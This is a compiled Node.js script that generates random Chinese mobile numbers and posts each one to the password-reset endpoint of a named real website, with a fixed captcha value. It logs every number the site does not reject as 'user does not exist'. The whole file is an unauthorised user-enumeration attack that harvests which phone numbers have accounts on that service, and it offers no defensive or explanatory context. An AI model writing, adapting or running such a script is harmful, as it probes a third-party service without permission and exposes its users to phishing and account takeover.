'use strict';

var _lodash = require('lodash');

var _lodash2 = _interopRequireDefault(_lodash);

var _mockjs = require('mockjs');

var _mockjs2 = _interopRequireDefault(_mockjs);

var _axios = require('axios');

var _axios2 = _interopRequireDefault(_axios);

var _qs = require('qs');

var _qs2 = _interopRequireDefault(_qs);

var _data = require('./data');

var _data2 = _interopRequireDefault(_data);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

var Mobile = /^1[35789]\d{9}$/;
console.log(_data2.default);
/**
 * axios 公共配置
 * [1] 拦截请求
 * [2] 拦截返回
 */
_axios2.default.interceptors.request.use(function (config) {
  // Do something before request is sent 
  // 超时设置
  config.timeout = config.timeout || 60000;

  // 调用测试环境接口
  // config.url = "https://domain" + config.url

  // 转换 post 中的 data
  config.transformRequest = [function (data) {
    !!data && (data = _qs2.default.stringify(data));
    return data;
  }];

  return config;
}, function (error) {
  // Do something with request error 
  return Promise.reject(error);
});
var kk = _mockjs2.default.mock({
  'array|1-10': [{
    'regexp': Mobile
  }]
});
console.log(kk);

_lodash2.default.forEach(kk.array, function (_ref) {
  var regexp = _ref.regexp;

  console.log(regexp);
  _axios2.default.post('http://www.cofool.com/Password/password.html', {
    rhref: '',
    user_name: regexp,
    pic: '5334'
  }).then(function (_ref2) {
    var data = _ref2.data;

    data = data.replace(/^\s+|\s+$/g, '');
    data = JSON.parse(data);
    if (data.info !== '用户不存在') {
      console.log('phone: ' + regexp);
      console.log(data);
    }
  });
});